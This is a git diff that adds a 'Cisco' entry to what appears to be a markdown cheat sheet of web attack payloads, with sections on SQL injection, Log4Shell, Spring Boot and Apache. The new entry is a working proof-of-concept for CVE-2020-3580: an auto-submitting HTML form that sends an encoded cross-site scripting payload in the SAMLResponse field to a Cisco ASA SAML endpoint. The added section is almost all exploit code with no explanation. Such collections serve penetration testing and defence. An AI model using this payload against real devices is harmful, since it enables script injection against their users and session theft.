@@ -57,6 +57,7 @@
 - [Log4Shell](#log4shell)
 - [Spring Boot](#spring-boot)
 - [Apache](#apache)
+- [Cisco](#cisco)
 
 
 ## SQL Injection
@@ -1720,3 +1721,24 @@ Accept: */*
 
 
 ```
+
+
+## Cisco
+
+**CVE-2020-3580**
+```html
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://domain/+CSCOE+/saml/sp/acs?tgname=a" method="POST">
+      <input type="hidden" name="SAMLResponse" value="&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;&apos;XSS&apos;&#41;&gt;" />
+      <input type="hidden" name="" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+ 
